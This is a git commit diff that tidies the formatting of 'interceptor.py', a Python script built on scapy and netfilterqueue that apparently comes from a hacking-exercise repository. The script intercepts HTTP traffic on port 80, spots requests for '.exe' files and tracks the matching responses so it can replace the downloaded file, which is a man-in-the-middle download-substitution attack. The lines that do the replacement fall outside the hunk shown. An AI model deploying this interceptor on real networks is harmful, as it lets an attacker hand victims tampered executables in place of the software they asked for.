7a6940a58495c0c5230eecb39fe4319f16dc7321
l0neaadil <loneaadil008@outlook.com>
2020-12-17 22:10:03 +0530

    interceptor

--- 06_File_interceptor/interceptor.py
+++ 06_File_interceptor/interceptor.py
@@ -6,14 +6,14 @@ ack_list=[]
 
 
 def process_packet(packet):
-    scapy_packet=scapy.IP(packet.get_payload)
+    scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
-        if scapy_packet[scapy.TCP].dport==80:
+        if scapy_packet[scapy.TCP].dport == 80:
             if '.exe' in scapy_packet[scapy.Raw].load:
                 print('--> exe request')
                 ack_list.append(scapy_packet[scapy.TCP].ack)
 
-        elif scapy_packet[scapy.TCP].sport==80:
+        elif scapy_packet[scapy.TCP].sport == 80:
             if scapy_packet[scapy.TCP].seq in ack_list:
                 ack_list.remove(scapy_packet[scapy.TCP].seq )
                 print('--> Replacing File')
@@ -25,8 +25,9 @@ def process_packet(packet):
     packet.accept()
 
 
-queue=netfilterqueue.NetfilterQueue()
-queue.bind(0,process_packet)
+queue = netfilterqueue.NetfilterQueue()
+queue.bind(0, process_packet)
 queue.run()
+
 
 
